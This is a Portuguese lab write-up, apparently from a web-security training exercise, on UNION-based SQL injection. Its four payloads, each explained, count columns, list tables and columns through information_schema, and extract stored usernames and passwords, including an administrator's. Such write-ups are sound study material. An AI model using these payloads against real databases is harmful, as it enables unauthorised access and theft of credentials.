# SQL Injection - Listing Database Contents

## Objetivo

Explorar SQL Injection para descobrir tabelas, colunas e extrair credenciais armazenadas no banco.

---

## 1. Descobrir quantidade de colunas

```sql
' UNION SELECT 'abc','def'--
```

### Como funciona

- `UNION` junta minha consulta com a original
- `abc` e `def` foram usados apenas para testar colunas

Resultado:

- Existem 2 colunas
- Ambas aceitam texto

---

## 2. Listar tabelas

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

### Como funciona

```sql
table_name
```

Retorna o nome das tabelas existentes.

```sql
information_schema.tables
```

É uma tabela interna que armazena informações do banco.

Resultado:

Foi encontrada a tabela:

```txt
users_abcdef
```

---

## 3. Listar colunas da tabela encontrada

```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
```

### Como funciona

Retorna todas as colunas existentes dentro da tabela encontrada.

Resultado:

```txt
username_abcdef
password_abcdef
```

---

## 4. Extrair credenciais

```sql
' UNION SELECT username_abcdef,password_abcdef FROM users_abcdef--
```

### Como funciona

Substitui valores de teste pelos nomes reais das colunas para retornar dados armazenados.

Resultado:

Foi possível visualizar usuários e senhas armazenados no banco, incluindo a conta `administrator`.

---

## Aprendizado

O processo seguiu a sequência:

```txt
Descobrir colunas
↓
Descobrir tabelas
↓
Descobrir colunas
↓
Extrair dados
```

Esse laboratório mostrou que SQL Injection não serve apenas para burlar filtros, mas também para enumerar e explorar a estrutura completa do banco de dados.
